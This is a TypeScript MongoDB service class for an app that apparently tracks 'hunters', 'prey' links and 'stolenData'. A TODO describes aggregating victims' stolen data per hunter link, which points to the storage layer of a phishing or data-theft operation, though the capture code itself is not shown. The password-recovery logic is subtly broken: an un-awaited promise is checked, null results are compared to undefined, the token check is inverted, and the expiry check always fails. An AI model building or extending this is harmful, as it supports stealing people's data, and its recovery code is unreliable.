import mongoDatabase from "../helper/mongodb.ts"
import { ObjectId } from "deps";
import {} from "../model/mongoSchema.ts"
//import {serviceCollection} from "./services.ts";
import {UserSchema, LinkSchema, PreySchema, PassRecoverySchema} from "../model/mongoSchema.ts"
import getRandomString from "../helper/randomString.ts"

const usersCollection = mongoDatabase.collection<UserSchema>("users")
const linksCollection = mongoDatabase.collection<LinkSchema>("links")
const preysCollection = mongoDatabase.collection<PreySchema>("preys")
const passRecoveryCollection = mongoDatabase.collection<PassRecoverySchema>("recovery")

//@Service()
class MongoService {

  constructor(
    private userCollection = usersCollection,
    private linkCollection = linksCollection,
    private preyCollection = preysCollection,
    private recoveryCollection = passRecoveryCollection
  ){}

  async createUser(_id: any, username: string, hashedPassword: string, placeHolder: string) {
    
    const result = await this.userCollection.insertOne({
        _id: _id,
        username: username,
        hashedPassword: hashedPassword,
        roles: 79, //79 user, 33 admin
        hunter: placeHolder,
        refreshToken: placeHolder
      });

      return result;
  }

  async createPrey(preyLink: string, stolenData: any) {
    const result = await this.preyCollection.insertOne({
        prey: preyLink,
        stolenData: stolenData,
      });
      return result;
  }  

    
  async createLinks(hunter: string, prey: string, action: string) {
    const result = await this.linkCollection.insertOne({
        hunter: hunter,
        prey: prey,
        action: action,
      });
      return result;
  }

  async findPrey(link: string) {
    let preyData = undefined;
    try {
      preyData = await this.linkCollection.findOne({ prey: { $in: [link] } });
      return preyData;
    } catch (error) {
      error;
    } 
  }

   // THIS SHOULD BE FINDING USERS EITHER BY EMAIL OR ID
  async findUser(type: string, param: string) {
    let userData = undefined;
    if (type === "id") {
        try {
            const _id = new ObjectId(param)
            userData = await this.userCollection.findOne({ _id: _id });
            return userData;
          } catch (error) {
            error;
          }
    }else if (type === "email") {
        try {
            userData = await this.userCollection.findOne({ username: { $in: [param] } });
            return userData;
          } catch (error) {
            error;
        } 
    }
  }

  // THIS SHOULD FIND REFRESH TOKENS
  async findToken(token: string) {
    let userData = undefined;
        try {
            userData = await this.userCollection.findOne({refreshToken: { $in: [token] } });
            return { "refreshToken": userData?.refreshToken, "id": userData?._id}
          } catch (error) {
            error;
          }
  }
  
  async associateHunter (hunter: string, id: string) {
    const _id = new ObjectId(id)
    await this.userCollection.updateOne(
      { _id:  _id },
      { $set: { hunter: hunter } },
    );
  }

  async associateRefreshToken (refreshToken: string, id: string) {
    const _id = new ObjectId(id)
      await this.userCollection.updateOne(
        { _id: _id},
        { $set: { refreshToken: refreshToken } },
      );
  }

  async deleteRefreshToken (id: string) {
    const _id = new ObjectId(id)
    await this.userCollection.updateOne(
      { _id: _id},
      { $set: { refreshToken: "refreshToken" } },
    );
  }

  

    //TODO: We need to create update methods for changing password, to link a hunter ID into an account
  async update() {}
  
  async delete() {}
  /*TODO:
    Need to create a new collection called "preys". In there we'll store {praylink, stolen_data}. When we want to gather 
    the information we use the hunter link to find the prey link and then we aggregate the preys with:
        Aggregation
            const docs = await users.aggregate([
              { $match: { username: "many" } },
              { $group: { _id: "$username", total: { $sum: 1 } } },
            ]).toArray();
   */

  // 
  async checkPasswordRecoveryToken(type: string, data: string): Promise< PassRecoverySchema | boolean | undefined> {
    
    if (type === 'email') {
      try {
        let userData = undefined;
        userData = await this.recoveryCollection.findOne({ 
          username: { $in: [data] } 
        });
        return userData === undefined ? false : userData
      } catch (error) {
          console.log(error);
      }
    }

    else if (type === 'token') {
      try {
        let userData = undefined;
        userData = await this.recoveryCollection.findOne({ 
          recoveryToken: { $in: [data] } 
        });
        return userData === undefined ? false : userData
      } catch (error) {
          console.log(error);
      }
    }

    else return false
  }

  // create a token
  async passwordRecoveryToken(email: string): Promise<string | boolean | undefined> {
    // user has account
    if (this.findUser('email', email) === undefined) return false
    // user doesnt have active token
    const user = await this.checkPasswordRecoveryToken('email', email)
    if (!user) return false
    //TODO: ADD A CONDITION SO IF THE TOKEN IS ALLREADY CREATED, SEND IT AGAIN
    //else if (user.recovery)
    
    // create and store recovery token
    const recoveryToken = getRandomString(50);
    try {
      await this.recoveryCollection.insertOne({
        username: email,
        recoveryToken: recoveryToken,
        expiration: Date.now()
      });
      // TODO: THIS FUNCTIONS RETURNS A RECOVERY TOKEN IF THE USER EXIST AND THERE IS NO TOKEN CREATED
      return recoveryToken
    } catch (error) {
      console.log(error);
    }
  }

  async resetPassword(token: string): Promise<boolean>{
    
    // user doesnt have active token
    const user = await this.checkPasswordRecoveryToken('token', token)
    if (!user) return false
    
    // token has expired
    const time = Date.now();
    const threshold = 30 * 60 * 1000 // token expires after 30 min
    if (time /*- user.expiration*/ > threshold) return false

    return true
  } //TODO: THIS FUNCITON RETURNS TRUE IF YOU ARE ALLOWED TO CHANGE THE PASSWORD, CREATE WHANGE PASSWORD FUNCTION


}

//serviceCollection.addTransient(MongoService)

export default MongoService;